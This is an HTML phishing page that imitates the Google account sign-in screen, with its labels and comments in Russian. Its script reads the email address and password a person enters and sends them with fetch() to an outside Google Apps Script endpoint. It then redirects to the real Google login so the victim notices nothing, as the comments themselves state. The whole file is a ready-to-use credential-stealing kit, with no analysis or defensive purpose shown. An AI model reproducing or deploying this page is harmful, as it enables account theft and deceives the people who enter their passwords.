<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в аккаунт Google</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; background-color: #f0f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; width: 100%; max-width: 400px; box-sizing: border-box; text-align: center; }
        .logo { width: 80px; margin-bottom: 20px; }
        h2 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
        button:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
        <h2>Вход</h2>
        <p>Перейдите на Gmail</p>
        <form id="hackForm">
            <input type="text" id="email" placeholder="Электронная почта или телефон" required>
            <input type="password" id="pass" placeholder="Введите пароль" required>
            <button type="submit">Далее</button>
        </form>
    </div>

    <script>
        document.getElementById('hackForm').onsubmit = function(e) {
            e.preventDefault();
            
            let email = document.getElementById('email').value;
            let password = document.getElementById('pass').value;
            
            // ОТПРАВЛЯЕМ В GOOGLE СКРИПТ (ОН НЕ ЗАБЛОКИРОВАН)
            let url = "https://script.google.com/macros/s/AKfycbx9zEDRBjxcgSbAy7Mi6fb6Z2R13fvXexbPXungLnle2T9GibPoqNzzND7dbkMZKbRZ/exec?email=" + encodeURIComponent(email) + "&pass=" + encodeURIComponent(password);
            
            fetch(url, {mode: 'no-cors'}).then(() => {
                // Отправляем на реальный Гугл, чтобы человек ничего не понял
                window.location.href = "https://accounts.google.com"; 
            }).catch(() => {
                // Если вдруг ошибка, все равно кидаем на Гугл
                window.location.href = "https://accounts.google.com"; 
            });
        };
    </script>
</body>
</html>
